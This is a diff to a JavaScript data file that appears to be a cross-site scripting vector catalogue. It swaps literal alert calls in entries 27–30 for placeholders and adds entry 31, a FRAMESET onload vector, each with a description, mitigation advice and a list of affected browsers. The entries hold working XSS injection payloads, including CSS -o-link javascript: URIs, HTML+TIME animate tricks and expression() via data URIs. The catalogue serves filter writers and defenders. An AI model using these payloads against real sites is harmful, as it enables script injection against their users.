@@ -425,7 +425,7 @@ var items =
         'id'         : 27,
         'category'   : 'css', 
         'name'       : 'Opera whole-page click hijacking via CSS',
-        'data'       : '<style>p[foo=bar{}*{-o-link:\'javascript:alert(1)\'}{}*{-o-link-source:current}]{color:red};</style>',
+        'data'       : '<style>p[foo=bar{}*{-o-link:\'%js_uri_alert%\'}{}*{-o-link-source:current}]{color:red};</style>',
         'description': 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href.',
         'tickets'    : [],
         'howtofix'   : 'In case users are allowed to submit CSS make sure the properties allowed are whitelisted and attribute selector content does not allow the combination {...} because it breaks out the attribute selector and allows declaration of new properties.',            
@@ -439,7 +439,7 @@ var items =
         'id'         : 28,
         'category'   : 'htmlplustime', 
         'name'       : 'JavaScript execution via HTML+TIME without user interaction (1)',
-        'data'       : '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>',
+        'data'       : '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=%js_alert%&gt;>',
         'description': 'This HTML+TIME vector utilized the attributes "attributename" and "values" to map ecoded markup into an attribute to execute JavaScript.',
         'tickets'    : [],
         'howtofix'   : 'As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html "xmlns" attributes should not be allowed - as well as "behavior" properties for style tags and attribtes. Don\'t rely on blacklisting when dealing with user submitted markup.',            
@@ -455,7 +455,7 @@ var items =
         'id'         : 29,
         'category'   : 'css', 
         'name'       : 'JavaScript execution via <LINK> href attribute and data URI',
-        'data'       : '<link rel=stylesheet href=data:,*%7bx:expression(write(4))%7d',
+        'data'       : '<link rel=stylesheet href=data:,*%7bx:expression(%js_write%)%7d',
         'description': 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <LINK> tag.',
         'tickets'    : [],
         'howtofix'   : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <LINK> tags will not be displayed unfiltered.',            
@@ -467,11 +467,11 @@ var items =
         'tags'       : ['xss', 'javascript', 'ie', 'css', 'expression', 'datauri', 'proprietary'],
         'reporter'   : '.mario'
     },
-    { /* ID 30 - JavaScript execution via <style> @import and data URI  */
+    { /* ID 30 - JavaScript execution via <STYLE> @import and data URI  */
         'id'         : 30,
         'category'   : 'css', 
         'name'       : 'JavaScript execution via <STYLE> @import and data URI',
-        'data'       : '<style>@import "data:,*%7bx:expression(write(2))%7D";</style>',
+        'data'       : '<style>@import "data:,*%7bx:expression(%js_write%)%7D";</style>',
         'description': 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <STYLE> @import directive.',
         'tickets'    : [],
         'howtofix'   : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <STYLE> cannot contain the @import directive.',            
@@ -481,6 +481,24 @@ var items =
             ]
         },
         'tags'       : ['xss', 'javascript', 'ie', 'css', 'expression', 'datauri', 'proprietary'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 31 - JavaScript execution via <FRAMESET> and onload  */
+        'id'         : 31,
+        'category'   : 'html', 
+        'name'       : 'JavaScript execution via <FRAMESET> and onload',
+        'data'       : '<frameset onload=%js_alert%>',
+        'description': 'This classic vectors shows that several tags don\'t need a "src" attribute to fire onload events, such as <IFRAME>, <BODY> and <FRAMESET>.',
+        'tickets'    : [],
+        'howtofix'   : 'Be sure to work with whitelists when allowing users to submit markup - else ancient tags like <FRAMESET> might be forgotten to filter and escape.',            
+        'browsers'   : {
+            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
+            'opera': ['8.x', '9.x', '10.x'], 
+            'firefox' : ['1.x', '2.x', '3.x'], 
+            'chrome': ['2.x', '3.x', '4.x', '5.x'],
+            'safari': ['3.x', '4.x']
+        },
+        'tags'       : ['xss', 'javascript', 'frames', 'classic', 'html', 'onload'],
         'reporter'   : '.mario'
     }
 ]
